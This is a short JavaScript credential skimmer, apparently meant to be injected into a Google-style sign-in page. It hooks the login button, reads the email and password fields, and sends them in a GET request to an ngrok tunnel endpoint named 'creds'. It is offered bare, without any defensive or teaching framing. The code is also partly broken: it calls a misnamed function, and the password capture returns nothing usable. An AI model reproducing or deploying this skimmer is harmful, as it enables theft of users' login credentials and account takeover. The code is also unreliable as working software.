function send_email(){
    let email = document.querySelector('[type="email"]');
    let param = email.value;
    
    return param
}

function send_pwd(){
    const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

    btn[1].addEventListener('click', function(){

    let email = document.querySelector('[type="password"]');
    let param = email.value;

    return param

    })
}



                                  
                                  
                                  
function teste_send(user, pass){
   setTimeout(function(){
       var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://0a3d-45-162-158-3.sa.ngrok.io/creds?user=" + user + "&pass=" + pass, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                console.log(xhr.responseText);
            }
        };
        xhr.send();
        
    },4000)
           
           
}


const btn = document.getElementsByClassName('VfPpkd-LgbsSe');

btn[1].addEventListener('click', function(){
    test_send(send_email(), setTimeout(function(){send_pwd()},3000))
    //user = send_email();
    //setTimeout(function() {
    //    pwd = send_pwd()
        
        //setTimeout(function(){send_data(user, pwd)}, 3000)
    //}, 3000);
    
    //test_send(user, pwd)
    
})
